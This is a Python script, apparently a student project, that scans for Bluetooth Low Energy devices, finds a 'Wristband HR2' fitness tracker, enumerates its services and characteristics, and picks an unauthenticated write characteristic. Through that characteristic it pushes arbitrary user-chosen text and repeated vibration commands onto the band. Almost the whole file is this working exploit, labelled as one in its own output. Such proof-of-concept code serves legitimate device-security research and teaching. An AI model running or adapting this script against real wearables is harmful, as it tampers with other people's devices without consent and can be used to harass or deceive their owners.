from bluepy.btle import *
import sys
import binascii
import constants
import time

# Created by Oos3c

################
##==THOROUGH==##
################

# Informs the user of avaliable modes

try:
	if sys.argv[1] != '-t':
		print("\nUse \'python3 final_project.py -t\' for thorough testing.")
except:
	print("\nUse \'python3 final_project.py -t\' for thorough testing.")


############
##==SCAN==##
############

# Scans for peripheral BLE devices using the BLE adapter

class FitnessTracker(Peripheral):
	def __init__(self, mac_address):
		Peripheral.__init__(self, mac_address, ADDR_TYPE_PUBLIC)


class MyDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleNotification(self, cHandle, data):
        print("A notification was received: {}".format(data))


class ScanDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleDiscovery(self, device, newDevice, newData):
        if newDevice:
            print("New device: " + device.addr)
        elif newData:
        	print("New data from: " + device.addr)




print("\n\n")
print("###############")
print("##==DEVICES==##")
print("###############")
print("\n")

print("Scanning for devices...\n")
scanner = Scanner().withDelegate(ScanDelegate())
try:
	devices = scanner.scan(10)
	print("\n")
except:
	print("Error occured, please reset BLE adapter.\n")
	exit(0)


# This prints individual scan data

try:
	if sys.argv[1] == '-t':
		for dev in devices:
			print("Address = " + dev.addr)
			print("Address Type = " + dev.addrType)
			print("RSSI = " + str(dev.rssi))
			print("\n")
except:
	pass


# Checks for 'Wristband HR2' in list of found devices

for dev in devices:
	for data in dev.getScanData():
		if "Wristband HR2" in data:
			device = dev.addr
try:
	print("Wristband HR2 found: {}\n".format(device))
	print("************************")
	print("** ATTEMPTING EXPLOIT **")
	print("************************")
	print("\n")
except:
	print("No Wristband HR2 found, exiting program...")
	exit(0)

# Connects to fitness tracker

tracker = FitnessTracker(device)


try: 
	descriptors = tracker.getDescriptors()
except:
	print("descriptor issue")
	exit(0)

try:
	if sys.argv[1] == '-t':
		print("\n\n")
		print("###################")
		print("##==DESCRIPTORS==##")
		print("###################")
		print("\n")

		# Print all descriptors
		
		for descriptor in descriptors:
			print(str(descriptor.uuid) + "\t" + hex(descriptor.handle) + "\t" + str(descriptor))
except:
	pass


try:
	characteristics = tracker.getCharacteristics()
except:
	print("charactertic issue")
	exit(0)


try:
	if sys.argv[1] == '-t':
		print("\n\n")
		print("#######################")
		print("##==CHARACTERISTICS==##")
		print("#######################")
		print("\n")

		# Print all characteristics 

		for characteristic in characteristics:
			print(str(characteristic.uuid) + "\t" + hex(characteristic.getHandle()) + "\t" + characteristic.propertiesToString())
except:
	pass

try:
	services = tracker.getServices()
except:
	print("services issue")
	exit(0)

try:
	if sys.argv[1] == '-t':
		print("\n\n")
		print("################")
		print("##==SERVICES==##")
		print("################")
		print("\n")

		# Print all services
		
		for service in services:
			print(str(service) + "\t" + str(service.uuid))
except:
	pass


try:
	if sys.argv[1] == '-t':
		print("\n\n")
		print("#################")
		print("##==READ DATA==##")
		print("#################")
		print("\n")

		# Read characteristics - some data seems false? i.e. battery level etc.
		
		for characteristic in characteristics:
			if 'READ' in characteristic.propertiesToString():
				reading = characteristic.read()
				try:
					print(str(characteristic) + "\t\t" + reading.decode('latin-1'))
				except UnicodeDecodeError:
					print(str(characteristic) + "\t\t" + str(reading))
		print("\n\n")
except:
	pass

# Finds exploitable handle in fitness tracker

for characteristic in characteristics:
	if ("WRITE" in characteristic.propertiesToString() and \
		"NO RESPONSE" in characteristic.propertiesToString()):
		print("Found exploitable characteristic: ")
		print(str(characteristic.uuid) + "\t" + hex(characteristic.getHandle()))
		print("\n")
		exploitHandle = characteristic.getHandle()
		break

# Accepts user input to print on fitness tracker

print("Please enter the text you wish to display on the band. Maximum 45 characters.")
exploitText = input("Input: ")
while len(exploitText) > 45:
	print("More than 45 characters, try again.")
	exploitText = input("Input: ")

print("\n")

# Accepts user input to vibrate band (seconds)

print("Please enter the length of time you would like the band to vibrate (seconds).")
exploitTime = int(input("Input: "))
while exploitTime > 60:
	print("No more than one minute. Try again.")
	exploitTime = int(input("Input: "))


# This will clear any text sent previously to the band.

clear = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
tracker.writeCharacteristic(exploitHandle, b'\x00\x00\x00\x8b' + clear)
tracker.writeCharacteristic(exploitHandle, b'\x00\x00\x10\x8b' + clear)
tracker.writeCharacteristic(exploitHandle, b'\x09\x00\x20\x8b' + clear)

# Splits user input into 3 stings

exploitText1 = exploitText[0:16]
exploitText2 = exploitText[16:32]
exploitText3 = exploitText[32:]

# Fills empty strings

if len(exploitText2) != 16:
	exploitText2 += " "*(16-len(exploitText2))
if len(exploitText3) == 0:
	exploitText3 = " "*15

vibrate = b'\x01\x00'

print("\nSending exploit. The band will now vibrate showing the text.\n")

# Sends text

byteExploitText1 = b'\x00\x00\x00\x8b' + exploitText1.encode()
byteExploitText2 = b'\x00\x00\x10\x8b' + exploitText2.encode()
byteExploitText3 = b'\x09\x00\x20\x8b' + exploitText3.encode() + b'\x00'
tracker.writeCharacteristic(exploitHandle, byteExploitText1)
tracker.writeCharacteristic(exploitHandle, byteExploitText2)
tracker.writeCharacteristic(exploitHandle, byteExploitText3)

# Sends time to vibrate

timeout = time.time() + exploitTime
while True:
	tracker.writeCharacteristic(exploitHandle, vibrate)
	if time.time() > timeout:
		break
	

print("disconnecting...")
tracker.disconnect()
